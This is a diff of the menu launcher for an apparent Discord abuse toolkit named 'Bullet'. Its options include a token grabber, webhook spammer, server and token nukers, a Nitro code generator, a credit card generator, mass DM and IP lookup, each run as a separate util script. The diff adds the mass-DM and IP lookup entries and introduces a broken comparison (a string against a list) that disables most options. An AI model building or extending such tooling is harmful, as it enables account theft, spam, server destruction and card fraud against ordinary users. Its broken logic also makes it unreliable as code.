@@ -72,40 +72,41 @@ def logo():
 def main():
     print(f"""
 
-                                    {lr}[{b}01{lr}]{b} Bullet Token Grabber     {lr}[{b}06{lr}]{b} Token Lookup
-                                    {lr}[{b}02{lr}]{b} Webhook Spammer          {lr}[{b}07{lr}]{b} Server Lookup
-                                    {lr}[{b}03{lr}]{b} Webhook Deleter          {lr}[{b}08{lr}]{b} Nitro Generator
-                                    {lr}[{b}04{lr}]{b} Server Nuker             {lr}[{b}09{lr}]{b} CC Generator
-                                    {lr}[{b}05{lr}]{b} Token Nuker              {lr}[{b}10{lr}]{b} Soon
+                        {lr}[{b}01{lr}]{b} Bullet Token Grabber     {lr}[{b}06{lr}]{b} Token Lookup      {lr}[{b}11{lr}]{b} IP lookup
+                        {lr}[{b}02{lr}]{b} Webhook Spammer          {lr}[{b}07{lr}]{b} Server Lookup     {lr}[{b}12{lr}]{b} N/A
+                        {lr}[{b}03{lr}]{b} Webhook Deleter          {lr}[{b}08{lr}]{b} Nitro Generator   {lr}[{b}13{lr}]{b} N/A
+                        {lr}[{b}04{lr}]{b} Server Nuker             {lr}[{b}09{lr}]{b} CC Generator      {lr}[{b}14{lr}]{b} N/A
+                        {lr}[{b}05{lr}]{b} Token Nuker              {lr}[{b}10{lr}]{b} Bot Mass DM       {lr}[{b}15{lr}]{b} N/A
 
 
 """)
     a = input(f" {b}<{lr}root{b}@{lr}bullet{b}> ")
 
-    if a == "1":
+    if a == ["1","01"]:
         grabbing()
-    if a == "2":
+    if a == ["2","02"]:
         s.call("python util\spam.py", shell=True)
-    if a == "3":
+    if a == ["3","03"]:
         s.call("python util\deleter.py", shell=True)
-    if a == "4":
+    if a == ["4","04"]:
         s.call("python util\snuker.py", shell=True)
-    if a == "5":
+    if a == ["5","05"]:
         s.call("python util\destroyer.py", shell=True)
-    if a == "6":
+    if a == ["6","06"]:
         print(f"{lr} Shit my not be working.")
         s.call("python util\lookup.py", shell=True)
-    if a == "7":
+    if a == ["7","07"]:
         s.call("python util\slookup.py", shell=True)
-    if a == "8":
+    if a == ["8","08"]:
         print(f"{lr} Unchecked Codes")
-        s.call("python util\codez.py")
+        s.call("python util\codez.py", shell=True)
         input()
-    if a == "9":
-        s.call("python util\ccgen.py")
+    if a == ["9","09"]:
+        s.call("python util\ccgen.py", shell=True)
     if a == "10":
-        print(f"\n{lr}[{b}Bullet{lr}] {b} New feature soon")
-        input()
+        s.call("python util\massdm.py", shell=True)
+    if a == "11":
+        s.call("python util\iplookup.py", shell=True)    
 
 while True:
     clear()
